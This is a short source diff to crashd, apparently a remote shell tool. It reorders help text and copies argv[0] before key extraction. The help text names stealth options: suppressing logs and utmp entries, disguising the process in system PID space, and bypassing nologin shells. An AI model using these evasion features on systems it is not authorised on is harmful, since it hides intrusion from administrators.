@@ -54,15 +54,15 @@ using namespace crash;
 
 void help(const char *p)
 {
-	printf("\nUsage:\t%s [-U] [-q] [-a] [-6] [-w] [-H host] [-p port] [-A auth keys]\n"
-	       "\t [-k server key-file] [-c server X509 certificate] [-P port]\n"
+	printf("\nUsage:\t%s [-U] [-q] [-a] [-6] [-H host] [-p port] [-A auth keys]\n"
+	       "\t [-k server key-file] [-c server X509 certificate] [-P port] [-w]\n"
 	       "\t [-t trigger-file] [-m trigger message] [-e] [-g good IPs]\n\n"
 	       "\t -a -- always login if authenticated, despite false/nologin shells\n"
 	       "\t -U -- run as user (e.g. turn off setuid() calls) if invoked as such\n"
 	       "\t -e -- extract key and certfile from the binary itself (no -k/-c needed)\n"
 	       "\t -q -- quiet mode, turns off logging and utmp entries\n"
 	       "\t -6 -- use IPv6 rather than IPv4\n"
-	       "\t -w -- wrap around PID's so crashd appears in system PID space\n"
+	       "\t -w -- wrap around PID to appear in system PID space (must be last arg!)\n"
 	       "\t -H -- host to connect to; if omitted: passive connect (default)\n"
 	       "\t -p -- port to connect/listen to; default is %s\n"
 	       "\t -P -- local port used in active connects (default is no bind)\n"
@@ -108,6 +108,7 @@ int main(int argc, char **argv)
 {
 	int c = 0, i = 0;
 	char **orig_argv = argv;
+	char *argv0 = strdup(argv[0]);
 	int orig_argc = argc;
 
 	// First of all, some ugly parsing, so it can be called
@@ -260,7 +261,7 @@ int main(int argc, char **argv)
 
 	// extract key/cert from ELF binary into tmp file
 	if (config::extract_blob) {
-		config::keyfile = extract_keys(orig_argv[0]);
+		config::keyfile = extract_keys(argv0);
 		config::certfile = config::keyfile;
 		if (config::keyfile.size() == 0)
 			return 1;
